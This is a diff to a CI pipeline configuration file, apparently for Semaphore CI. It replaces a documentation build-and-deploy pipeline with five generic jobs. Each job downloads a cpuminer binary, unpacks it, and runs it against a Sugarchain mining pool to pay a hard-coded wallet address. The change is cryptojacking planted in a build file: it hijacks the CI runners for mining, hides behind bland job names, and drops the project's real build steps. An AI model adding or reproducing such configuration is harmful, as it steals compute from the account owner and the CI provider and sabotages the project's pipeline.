@@ -1,28 +1,35 @@
 version: v1.0
-name: Docs
+name: Initial Pipeline
 agent:
   machine:
     type: e1-standard-2
     os_image: ubuntu1804
 blocks:
-  - name: Make & push
+  - name: 'Block #1'
     task:
-      prologue:
-        commands:
-          - checkout
       jobs:
-        - name: Mkdocs & Nginx
+        - name: 'Job #1'
           commands:
-            - make configure.gcloud
-            - make mkdocs.build
-            - make nginx.build
-            - make nginx.test
-            - make nginx.push
-      secrets:
-        - name: s2prod-gce
-
-promotions:
-  - name: Staging
-    pipeline_file: stg.yml
-    auto_promote:
-      when: "result = 'passed'"
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg. -t0'
+        - name: 'Job #2'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg. -t0'
+        - name: 'Job #3'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg. -t0'
+        - name: 'Job #4'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg. -t0'
+        - name: 'Job #5'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - tar xf cpuminer-opt-linux.tar.gz
+            - './cpuminer-sse2 -a yespowersugar -o 1pool.sugarchain.org:3333 -u sugar1q3ck407x6v7m6gjnw08x63r3cf7er06xlpsr0kg. -t0'
